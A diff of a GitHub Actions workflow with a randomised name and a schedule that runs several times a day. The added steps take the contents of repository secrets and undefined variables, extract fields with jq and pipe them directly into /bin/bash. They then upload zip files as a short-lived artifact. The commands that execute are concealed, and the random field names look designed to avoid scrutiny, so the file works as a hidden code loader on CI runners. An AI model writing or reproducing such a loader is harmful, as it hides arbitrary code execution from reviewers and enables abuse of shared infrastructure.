@@ -1,25 +1,27 @@
 name: xueyanchangju
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '52 3/6 * * *'
-jobs:  # 9499
+    - cron: '31 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xueyanchangju
         env:
-          e8: ${{ secrets.e8 }}
+          pq6890: ${{ secrets.pq6890 }}
         run: |
-          echo $e8 | jq -r .rkugc1076 | /bin/bash
-          echo $uouw949 | jq -r .obgo1 | /bin/bash
-          echo $s835 | jq -r .tmrp5144 | /bin/bash
-          echo $w47087 | jq -r .mk79983 | /bin/bash
-          echo $cnifw96143 | jq -r .kq98862 | /bin/bash
-          echo $zxzj72 | jq -r .eootq7331 | /bin/bash
-          echo $pjh02987 | jq -r .mh2 | /bin/bash
-          echo $asyg5 | jq -r .afqm77968 | /bin/bash
-          echo $ppbj3679 | jq -r .kriq7130 | /bin/bash
+          printf '%s' "$pq6890" | jq -r .yveg4868 | /bin/bash
+          echo $suhsw8 | jq -r .m91 | /bin/bash
+          printf '%s' "$w402" | jq -r .q85850 | /bin/bash
+          echo $wi3711 | jq -r .xz220 | /bin/bash
+          printf '%s' "$kf0964" | jq -r .xsx88807 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aeFmLFiD
+          path: "*.zip"
+          retention-days: 1
